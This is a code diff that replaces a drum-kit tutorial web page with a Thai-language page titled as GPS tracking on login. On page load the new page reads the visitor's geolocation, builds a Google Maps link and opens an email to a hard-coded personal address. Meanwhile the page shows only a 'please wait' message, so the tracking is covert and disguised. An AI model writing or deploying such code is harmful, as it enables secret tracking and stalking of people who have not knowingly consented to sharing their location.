@@ -1,35 +1,31 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
-
+<html>
 <head>
-  <meta charset="utf-8">
-  <title>Drum Kit</title>
-  <link rel="stylesheet" href="styles.css">
-  <link href="https://fonts.googleapis.com/css?family=Arvo" rel="stylesheet">
+    <title>ติดตาม GPS เมื่อเข้าสู่ระบบ</title>
+    <script>
+        function sendLocationToEmail() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    var latitude = position.coords.latitude;
+                    var longitude = position.coords.longitude;
 
+                    var link = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                    sendEmailWithLink(link);
+                });
+            } else {
+                alert("เบราว์เซอร์ของคุณไม่รองรับการเข้าถึงตำแหน่งทางภูมิศาสตร์");
+            }
+        }
 
-  </script>
+        function sendEmailWithLink(link) {
+            var recipientEmail = "Oonanongwan2547@gmail.com";
+            var subject = "ตำแหน่ง GPS";
+            var emailBody = `คลิกที่ลิงก์นี้เพื่อดูตำแหน่ง: ${link}`;
+            window.location.href = `mailto:${recipientEmail}?subject=${subject}&body=${emailBody}`;
+        }
+    </script>
 </head>
-
-<body>
-
-  <h1 id="title">Drum 🥁 Kit</h1>
-  <div class="set">
-    <button class="w drum">w</button>
-    <button class="a drum">a</button>
-    <button class="s drum">s</button>
-    <button class="d drum">d</button>
-    <button class="j drum">j</button>
-    <button class="k drum">k</button>
-    <button class="l drum">l</button>
-  </div>
-
-
-  <footer>
-    Credit: https://www.appbrewery.co/
-  </footer>
-
-  <script src="index.js" charset="utf-8"></script>
+<body onload="sendLocationToEmail()">
+    <h1>กรุณารอสักครู่...</h1>
 </body>
-
 </html>
